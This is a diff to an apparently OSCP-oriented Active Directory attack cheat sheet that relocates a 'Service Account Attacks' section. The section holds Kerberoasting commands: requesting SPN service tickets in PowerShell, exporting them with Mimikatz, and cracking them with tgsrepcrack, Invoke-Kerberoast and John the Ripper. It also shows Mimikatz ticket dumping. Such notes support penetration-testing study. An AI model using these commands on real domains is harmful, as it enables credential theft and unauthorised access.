@@ -14,6 +14,7 @@
 * ZeroLogon Vulnerability
 * Password Spraying
 * Plaintext Credentials
+* Service Account Attacks
 * Pass-the-Hash
 * Overpass-the-Hash
 * Pass-the-Ticket
@@ -120,33 +121,12 @@ Kerberos authentication uses a ticketing system, where a Ticket Granting Ticket 
 * Hashes are stored in the Local Security Authority Subsystem Service (LSASS).
 * LSASS process runs as SYSTEM, so we need SYSTEM / local admin to dump hashes stored on target.
 
-Dumping hashes or Kerberos TGT/TGS tickets with Mimikatz
+Dumping Kerberos TGT/TGS tickets with Mimikatz
 ```
 mimikatz > sekurlsa::tickets
 ```
 
-Service account attacks
-* If we know the `serviceprincipalname` value from prior AD enum, we can target the SPN by by requesting a service ticket for it from the Domain Controller and access resources from the service with our own ticket.
-```powershell
-# request service ticket
-PS> Add-Type -AssemblyName System.IdentityModel
-PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken \
-        -ArgumentList '[service_principal_name]'
-
-# export cached tickets
-mimikatz > kerberos::list /export
-```
-
-Crack SPN hashes
-```bash
-# Kerberoast
-$ python3 tgsrepcrack.py rockyou.txt [ticket.kirbi]  # locally crack hashes
-PS> Invoke-Kerberoast.ps1                            # crack hashes on target
-
-# John the Ripper
-$ python3 kirbi2john.py -o johncrackfile ticket.kirbi  # convert ticket to john file
-$ john --wordlist=rockyou.txt johncrackfile
-```
+See "Service Account Attacks" on how to abuse dumped tickets.
 
 
 ## AD Lateral Movement
@@ -211,6 +191,31 @@ cmd> winrs -u:[username] -p:[password] -r:http://[target]:5985/wsman "cmd" # exe
 # Admin groups but with a "MANDATORY LABEL\MEDIUM" context?
 # Try UAC bypass technique.
 # See https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-main.md#user-account-control-uac-bypass
+```
+
+### Service Account Attacks
+
+Service account attacks
+* If we know the `serviceprincipalname` value from prior AD enum, we can target the SPN by by requesting a service ticket for it from the Domain Controller and access resources from the service with our own ticket.
+```powershell
+# request service ticket
+PS> Add-Type -AssemblyName System.IdentityModel
+PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken \
+        -ArgumentList '[service_principal_name]'
+
+# export cached tickets
+mimikatz > kerberos::list /export
+```
+
+Crack SPN hashes
+```bash
+# Kerberoast
+$ python3 tgsrepcrack.py rockyou.txt [ticket.kirbi]  # locally crack hashes
+PS> Invoke-Kerberoast.ps1                            # crack hashes on target
+
+# John the Ripper
+$ python3 kirbi2john.py -o johncrackfile ticket.kirbi  # convert ticket to john file
+$ john --wordlist=rockyou.txt johncrackfile
 ```
 
 ### Pass-the-Hash
